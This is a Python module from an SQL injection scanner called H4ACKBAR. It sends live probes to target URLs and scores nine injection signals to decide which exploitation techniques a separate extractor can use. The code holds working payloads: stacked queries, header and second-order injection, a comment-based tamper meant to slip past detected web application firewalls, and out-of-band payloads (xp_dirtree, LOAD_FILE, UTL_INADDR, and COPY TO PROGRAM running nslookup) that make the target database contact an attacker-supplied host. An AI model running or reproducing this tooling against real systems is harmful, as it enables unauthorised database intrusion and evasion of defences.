"""
H4ACKBAR v1.2.0 — DEEP DETECTOR.

Extends the v1.1 3-signal model into a 9-signal model with weighted scoring.

┌── Legacy signals (v1.1) ────────────────────────────────────┐
│  E  error-based        DBMS error string in response         │
│  B  boolean-blind      differential true vs false            │
│  T  time-blind         sleep payload delays baseline         │
│  U  union-hint         column-count probe alters length      │
├── NEW in v1.2.0 ────────────────────────────────────────────┤
│  S  stacked queries    ';SELECT 1;-- executed silently       │
│  O  out-of-band        DNS/HTTP callback token planted       │
│  H  header injection   User-Agent/Referer/Cookie reflection  │
│  2  second-order       write in POST, trigger read in GET    │
│  W  WAF-aware          403/429/challenge → tamper + retry    │
└─────────────────────────────────────────────────────────────┘

Each signal is scored by QUALITY, not just presence — see strength.py.

Design:
  - Backwards compatible with v1.1 Finding: extra fields default to safe empty.
  - Every probe is idempotent-labeled. Nothing writes to disk on target.
  - Rate-limiter enforced between probes on same host.
  - Abort-safe: cooperative cancellation via callable predicate.
"""

from __future__ import annotations

import re
import secrets
import statistics
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from difflib import SequenceMatcher

from .detector import BOOL_FALSE, BOOL_TRUE, ERROR_PROBES, TIME_PROBES, UNION_PROBES, Finding
from .fingerprint import fingerprint_response
from .sender import SendResult, send

# ── STACKED probes ──────────────────────────────────────────
# Silent stacked queries. Success = same body as baseline (server accepted
# the extra statement without breaking). Bombs on strict single-statement drivers.
STACKED_PROBES: dict[str, str] = {
    "mysql":      "1'; DO SLEEP(0)-- -",            # DO returns nothing
    "postgresql": "1'; SELECT 1 WHERE FALSE-- -",
    "mssql":      "1'; DECLARE @x INT-- -",
    "sqlite":     "1'; SELECT 1 WHERE 0-- -",
    "oracle":     "1'; BEGIN NULL; END-- -",        # PL/SQL block; may fail
    "generic":    "1'; SELECT 1 WHERE 1=0-- -",
}

# ── HEADER injection probes (User-Agent / Referer / Cookie) ─
# Some backends log/reflect headers directly into SQL (custom analytics tables).
HEADER_INJECTION_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "Cookie"]


# ── OOB scaffold ────────────────────────────────────────────
# Out-of-band exfil requires an attacker-controlled listener (DNSlog / Burp
# collab / Interactsh). H4ACKBAR does NOT ship a listener — it only builds the
# payload with a caller-supplied callback domain and reports whether the
# target's response looked like it *attempted* the load-file / xp_dirtree call.
#
# The presence of an S/E/T signal after firing an OOB payload is treated as
# "OOB primitive available" (weight capped) unless the caller wires up a real
# listener via detector_deep.set_oob_verifier().

_OOB_VERIFIER: Callable[[str], bool] | None = None

def set_oob_verifier(fn: Callable[[str], bool] | None) -> None:
    """
    Wire in an external OOB collab. `fn(token) -> bool` should return True
    when the caller's listener has received a hit for `token`.
    Callers WITHOUT a listener leave this None → OOB stays best-effort inference.
    """
    global _OOB_VERIFIER
    _OOB_VERIFIER = fn


def _oob_payload(dbms: str, callback_host: str, token: str) -> str | None:
    """Build an OOB probe. Returns None for DBMS with no reliable OOB primitive."""
    fq = f"{token}.{callback_host}"
    if dbms == "mysql":
        # requires FILE priv; often fails, but attempt is diagnostic
        return f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT '{fq}'),'\\\\a'))-- -"
    if dbms == "mssql":
        return f"'; EXEC master.dbo.xp_dirtree '\\\\{fq}\\a'-- -"
    if dbms == "oracle":
        return f"' AND UTL_INADDR.get_host_address('{fq}') IS NOT NULL-- -"
    if dbms == "postgresql":
        return f"'; COPY (SELECT '') TO PROGRAM 'nslookup {fq}'-- -"
    return None


# ── WAF fingerprint (mini) ──────────────────────────────────
# Full catalog lives in waf.py; this is the fast in-detector trigger check.
WAF_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"cloudflare",         re.I), "cloudflare"),
    (re.compile(r"__cfduid|cf-ray",    re.I), "cloudflare"),
    (re.compile(r"akamaighost|akamai", re.I), "akamai"),
    (re.compile(r"x-sucuri-id",        re.I), "sucuri"),
    (re.compile(r"mod_security|modsec",re.I), "modsecurity"),
    (re.compile(r"awselb|x-amz-cf-id", re.I), "aws_waf"),
    (re.compile(r"barracuda",          re.I), "barracuda"),
    (re.compile(r"f5-bigip|bigipserver",re.I), "f5"),
    (re.compile(r"imperva|incapsula",  re.I), "imperva"),
    (re.compile(r"wzws-ray",           re.I), "wangzhichuang"),
    (re.compile(r"safedog",            re.I), "safedog"),
]

WAF_STATUSES = {403, 406, 419, 429, 501, 999}


def _detect_waf(r: SendResult) -> str | None:
    if not r or r.status == 0:
        return None
    blob = " ".join([str(r.status), " ".join(f"{k}:{v}" for k, v in r.headers.items()), r.body[:2000]])
    for pat, name in WAF_SIGNATURES:
        if pat.search(blob):
            return name
    if r.status in WAF_STATUSES and (len(r.body) < 800 or "block" in r.body.lower()):
        return "generic_waf"
    return None


# ── extended Finding ─────────────────────────────────────────
@dataclass
class DeepFinding(Finding):
    """
    Superset of v1.1 Finding. Adds signal metadata, per-signal weights, and
    metrics that feed strength.compute_strength().
    """
    # per-signal quality metrics
    signal_meta: dict[str, dict] = field(default_factory=dict)
    # signals seen but LOW confidence — never counted toward .signals[]
    weak_signals: list[str] = field(default_factory=list)
    # detected WAF (if any) — reduces strength for E/O
    waf: str | None = None
    # observed HTTP anomalies (e.g. 500s on some probes)
    anomalies: list[str] = field(default_factory=list)
    # computed by strength.py after detection
    strength: float = 0.0            # 0.0 – 1.0
    strength_grade: str = "none"     # none|weak|moderate|strong|critical
    # technique matrix — what extractor.py can attempt
    techniques: list[str] = field(default_factory=list)


# ── low-level helpers ───────────────────────────────────────
def _similarity(a: str, b: str) -> float:
    if not a and not b: return 1.0
    if not a or not b:  return 0.0
    return SequenceMatcher(None, a[:20000], b[:20000]).quick_ratio()


def _now_ms() -> int:
    return int(time.perf_counter() * 1000)


def _median_time(url: str, method: str, param: str, inject_in: str,
                 n: int = 3) -> tuple[int, list[int]]:
    """N baseline requests → median ms, raw samples. Kills single-outlier jitter."""
    samples = []
    for i in range(n):
        r = send(url, method, f"h4ackbar_bl_{i}_{secrets.token_hex(2)}",
                 param, inject_in=inject_in)
        if r.error:
            continue
        samples.append(r.elapsed_ms)
    if not samples:
        return 0, []
    return int(statistics.median(samples)), samples


# ── DEEP analyzer ────────────────────────────────────────────
def analyze_param_deep(url: str,
                       method: str,
                       param: str,
                       inject_in: str = "query",
                       time_threshold_s: float = 3.0,
                       rate_limit_ms: int = 150,
                       max_requests: int = 60,
                       enable_stacked: bool = True,
                       enable_header: bool = True,
                       enable_second_order: bool = False,
                       second_order_read_url: str | None = None,
                       oob_callback_host: str | None = None,
                       abort: Callable[[], bool] | None = None,
                       progress: Callable[[str], None] | None = None) -> DeepFinding:
    """
    Full deep detector. Fires ≤ max_requests. Never loops.
    Returns DeepFinding with per-signal metadata and strength placeholder
    (call strength.compute_strength(finding) after to populate .strength).
    """
    def log(m: str):
        if progress: progress(m)

    def stop() -> bool:
        return bool(abort and abort())

    def sleep_rate():
        time.sleep(rate_limit_ms / 1000.0)

    f = DeepFinding(url=url, param=param, method=method, inject_in=inject_in)
    req_budget = max_requests

    # ── baseline (median of 3) ──
    log(f"[baseline×3] {param}")
    base_median, base_samples = _median_time(url, method, param, inject_in, n=3)
    req_budget -= 3
    if base_median == 0:
        f.evidence.append("[baseline error] no successful baseline requests")
        return f
    r0 = send(url, method, "h4ackbar_bl_final", param, inject_in=inject_in)
    req_budget -= 1
    if r0.error:
        f.evidence.append(f"[baseline error] {r0.error}")
        return f
    f.baseline_status = r0.status
    f.baseline_length = r0.length
    baseline_body    = r0.body
    baseline_time    = base_median
    f.payloads_tried = 4

    # WAF check on baseline
    f.waf = _detect_waf(r0)
    if f.waf:
        f.anomalies.append(f"waf={f.waf}")
        log(f"[waf] {f.waf} detected on baseline")

    if stop(): return f

    # ── E: error probes (v1.1) ──
    for probe in ERROR_PROBES:
        if req_budget <= 0 or stop(): break
        log(f"[E] {probe!r}")
        r = send(url, method, probe, param, inject_in=inject_in)
        req_budget -= 1; f.payloads_tried += 1; sleep_rate()
        if r.error: continue
        fp = fingerprint_response(r.headers, {}, r.body)
        if fp.dbms:
            if "E" not in f.signals:
                f.signals.append("E")
                f.signal_meta["E"] = {
                    "probe": probe, "dbms": list(fp.dbms),
                    "snippet": (r.body[:400] if r.body else ""),
                    "waf_suppressed": bool(f.waf),
                }
            for db in fp.dbms:
                if db not in f.dbms_guess:
                    f.dbms_guess.append(db)
            f.evidence.append(f"E: probe={probe!r} → dbms={','.join(fp.dbms)}")
            break

    # ── B: boolean differential (median-anchored) ──
    if req_budget >= 2 and not stop():
        log("[B] true probe")
        rt = send(url, method, BOOL_TRUE, param, inject_in=inject_in)
        req_budget -= 1; f.payloads_tried += 1; sleep_rate()
        log("[B] false probe")
        rf = send(url, method, BOOL_FALSE, param, inject_in=inject_in)
        req_budget -= 1; f.payloads_tried += 1; sleep_rate()
        if not rt.error and not rf.error:
            sim_tf = _similarity(rt.body, rf.body)
            sim_tb = _similarity(rt.body, baseline_body)
            sim_fb = _similarity(rf.body, baseline_body)
            len_delta = abs(rt.length - rf.length)
            # strong: TRUE~base, FALSE≠TRUE, length gap noticeable
            if sim_tb > 0.92 and sim_tf < 0.85 and len_delta > 20:
                f.signals.append("B")
                f.signal_meta["B"] = {
                    "sim_true_base": round(sim_tb, 3),
                    "sim_false_base": round(sim_fb, 3),
                    "sim_true_false": round(sim_tf, 3),
                    "len_delta": len_delta,
                    "true_status": rt.status, "false_status": rf.status,
                }
                f.evidence.append(
                    f"B: sim(t,b)={sim_tb:.2f} sim(f,b)={sim_fb:.2f} "
                    f"sim(t,f)={sim_tf:.2f} Δlen={len_delta}"
                )
            elif sim_tf < 0.98 and len_delta > 4:
                # weak — differential exists but ambiguous
                f.weak_signals.append("B")
                f.evidence.append(f"B(weak): Δlen={len_delta} sim(t,f)={sim_tf:.2f}")

    # ── T: time-based (per DBMS, capped) ──
    dbms_to_try = f.dbms_guess or ["generic"]
    for db in dbms_to_try[:2]:
        if req_budget <= 0 or stop(): break
        probe = TIME_PROBES.get(db, TIME_PROBES["generic"])
        log(f"[T] {db}")
        r = send(url, method, probe, param, inject_in=inject_in)
        req_budget -= 1; f.payloads_tried += 1; sleep_rate()
        delay = (r.elapsed_ms - baseline_time) / 1000.0
        if not r.error and delay >= time_threshold_s:
            # confirm with a 2nd shot to defeat jitter
            log(f"[T] {db} confirm")
            r2 = send(url, method, probe, param, inject_in=inject_in)
            req_budget -= 1; f.payloads_tried += 1; sleep_rate()
            delay2 = (r2.elapsed_ms - baseline_time) / 1000.0
            if delay2 >= time_threshold_s:
                f.signals.append("T")
                f.signal_meta["T"] = {
                    "dbms": db, "baseline_ms": baseline_time,
                    "probe_ms": r.elapsed_ms, "confirm_ms": r2.elapsed_ms,
                    "delay_s": round(delay, 2), "confirm_delay_s": round(delay2, 2),
                    "jitter_samples": base_samples,
                }
                if db != "generic" and db not in f.dbms_guess:
                    f.dbms_guess.append(db)
                f.evidence.append(
                    f"T: dbms={db} delay={delay:.2f}s confirm={delay2:.2f}s "
                    f"(baseline_median={baseline_time}ms)"
                )
                break
            else:
                f.weak_signals.append("T")
                f.evidence.append(f"T(weak): first={delay:.2f}s confirm={delay2:.2f}s")

    # ── U: union column-count hint (v1.1 tightened) ──
    changes = 0; hits: list[int] = []
    for i, probe in enumerate(UNION_PROBES):
        if req_budget <= 0 or stop(): break
        r = send(url, method, probe, param, inject_in=inject_in)
        req_budget -= 1; f.payloads_tried += 1; sleep_rate()
        if r.error: continue
        if r.status == r0.status and abs(r.length - f.baseline_length) > 15:
            changes += 1; hits.append(i + 1)
        if changes >= 2:
            f.signals.append("U")
            f.signal_meta["U"] = {
                "column_hints": hits,
                "trigger_count": changes,
            }
            f.evidence.append(f"U: {changes} column-count probes altered length (cols≈{hits})")
            break

    # ── S: stacked queries ──
    # Require: (a) DBMS already narrowed via another signal, AND (b) response body
    # actually differs slightly from baseline (proves server did NOT just ignore
    # the payload — a completely-ignored payload gives sim=1.0 with 0 length delta).
    if enable_stacked and not stop() and f.dbms_guess:
        for db in f.dbms_guess[:2]:
            if req_budget <= 0: break
            probe = STACKED_PROBES.get(db, STACKED_PROBES["generic"])
            log(f"[S] {db}")
            r = send(url, method, probe, param, inject_in=inject_in)
            req_budget -= 1; f.payloads_tried += 1; sleep_rate()
            if r.error: continue
            sim = _similarity(r.body, baseline_body)
            fp = fingerprint_response(r.headers, {}, r.body)
            len_delta = abs(r.length - f.baseline_length)
            # success = extra statement accepted → body ≈ baseline but NOT identical
            # (0.85 < sim < 1.0)  AND  no DBMS error appeared  AND  same status
            if (not fp.dbms and 0.85 < sim < 1.0
                and r.status == r0.status and len_delta > 0):
                f.signals.append("S")
                f.signal_meta["S"] = {
                    "dbms": db, "probe": probe,
                    "sim_base": round(sim, 3), "status": r.status,
                    "len_delta": len_delta,
                }
                f.evidence.append(
                    f"S: dbms={db} stacked accepted silently "
                    f"(sim={sim:.2f} Δlen={len_delta})"
                )
                break
            elif fp.dbms:
                for d in fp.dbms:
                    if d not in f.dbms_guess: f.dbms_guess.append(d)

    # ── H: header injection reflection ──
    if enable_header and inject_in != "header" and not stop():
        for hdr in HEADER_INJECTION_HEADERS:
            if req_budget <= 0: break
            marker = f"h4b{secrets.token_hex(3)}"
            payload = f"{marker}' AND SLEEP(0)-- -"
            log(f"[H] {hdr}")
            r = send(url, method, "h4ackbar_bl_h", param,
                     inject_in=inject_in,
                     headers={hdr: payload})
            req_budget -= 1; f.payloads_tried += 1; sleep_rate()
            if r.error: continue
            fp = fingerprint_response(r.headers, {}, r.body)
            reflected = marker in r.body
            if fp.dbms or reflected:
                f.signals.append("H")
                f.signal_meta["H"] = {
                    "header": hdr, "reflected": reflected,
                    "dbms": list(fp.dbms), "marker": marker,
                }
                f.evidence.append(
                    f"H: header={hdr} "
                    f"{'reflected+' if reflected else ''}"
                    f"{'dbms_error='+','.join(fp.dbms) if fp.dbms else ''}"
                )
                if fp.dbms:
                    for d in fp.dbms:
                        if d not in f.dbms_guess: f.dbms_guess.append(d)
                break

    # ── 2: second-order (write→read) ──
    # Requires an explicit read-back URL (e.g. profile page). No blind writes.
    if enable_second_order and second_order_read_url and not stop() and req_budget >= 2:
        marker = f"h4b2{secrets.token_hex(4)}"
        payload = f"{marker}',(SELECT 1)-- -"
        log("[2] write probe")
        rw = send(url, method, payload, param, inject_in=inject_in)
        req_budget -= 1; f.payloads_tried += 1; sleep_rate()
        if not rw.error:
            log(f"[2] read back {second_order_read_url}")
            rr = send(second_order_read_url, "GET", "", "h4b2read", inject_in="query")
            req_budget -= 1; f.payloads_tried += 1
            if not rr.error:
                fp = fingerprint_response(rr.headers, {}, rr.body)
                if fp.dbms or marker in rr.body:
                    f.signals.append("2")
                    f.signal_meta["2"] = {
                        "marker": marker,
                        "read_url": second_order_read_url,
                        "marker_visible": marker in rr.body,
                        "dbms_error": list(fp.dbms),
                    }
                    f.evidence.append(
                        f"2: write→read confirmed via {second_order_read_url}"
                    )

    # ── O: out-of-band (best-effort unless verifier wired) ──
    if oob_callback_host and not stop() and req_budget >= 1:
        for db in (f.dbms_guess or ["mysql","mssql","oracle","postgresql"])[:2]:
            probe = _oob_payload(db, oob_callback_host, secrets.token_hex(6))
            if not probe: continue
            token = probe.split(".")[0].rsplit("'", 1)[-1] if "." in probe else "h4b"
            log(f"[O] {db}")
            r = send(url, method, probe, param, inject_in=inject_in)
            req_budget -= 1; f.payloads_tried += 1; sleep_rate()
            if r.error: continue
            verified = False
            if _OOB_VERIFIER:
                try:
                    verified = bool(_OOB_VERIFIER(token))
                except Exception:
                    verified = False
            # inference fallback: if payload triggered a DBMS error, primitive works partially
            fp = fingerprint_response(r.headers, {}, r.body)
            if verified or fp.dbms:
                f.signals.append("O")
                f.signal_meta["O"] = {
                    "dbms": db,
                    "callback": oob_callback_host,
                    "verified_listener": verified,
                    "inferred_from_error": bool(fp.dbms and not verified),
                }
                f.evidence.append(
                    f"O: dbms={db} verified={verified} "
                    f"{'(inferred from DBMS error)' if fp.dbms and not verified else ''}"
                )
                break

    # ── W: WAF-aware retry (only if WAF seen) ──
    if f.waf and req_budget >= 1 and not stop():
        # simple tamper: URL-encode + comment injection
        tampered = "'/**/AND/**/1=1--+-"
        log(f"[W] tamper retry vs {f.waf}")
        r = send(url, method, tampered, param, inject_in=inject_in)
        req_budget -= 1; f.payloads_tried += 1; sleep_rate()
        if not r.error and r.status != r0.status and _detect_waf(r) is None:
            f.signals.append("W")
            f.signal_meta["W"] = {
                "waf": f.waf, "tamper": tampered,
                "baseline_status": r0.status, "tamper_status": r.status,
            }
            f.evidence.append(f"W: tamper bypassed {f.waf} (status {r0.status}→{r.status})")

    # ── legacy 'confidence' still populated for v1.1 compat ─
    n = len(f.signals)
    f.confidence = "high" if n >= 3 else "medium" if n == 2 else "low" if n == 1 else "none"

    # ── available techniques for extractor.py ──
    if "U" in f.signals: f.techniques.append("union")
    if "E" in f.signals: f.techniques.append("error")
    if "B" in f.signals: f.techniques.append("boolean")
    if "T" in f.signals: f.techniques.append("time")
    if "S" in f.signals: f.techniques.append("stacked")
    if "O" in f.signals: f.techniques.append("oob")

    return f


def analyze_targets_deep(targets: list[dict],
                         progress: Callable[[str], None] | None = None,
                         abort: Callable[[], bool] | None = None,
                         **kw) -> list[DeepFinding]:
    """Batch runner. kw is passed through to analyze_param_deep."""
    out: list[DeepFinding] = []
    total = len(targets)
    for i, t in enumerate(targets, 1):
        if abort and abort():
            break
        if progress:
            progress(f"[{i}/{total}] DEEP {t['method']} {t['url']}  param={t['param']}")
        f = analyze_param_deep(
            url=t["url"], method=t.get("method", "GET"),
            param=t["param"], inject_in=t.get("inject_in", "query"),
            progress=progress, abort=abort, **kw,
        )
        out.append(f)
    return out
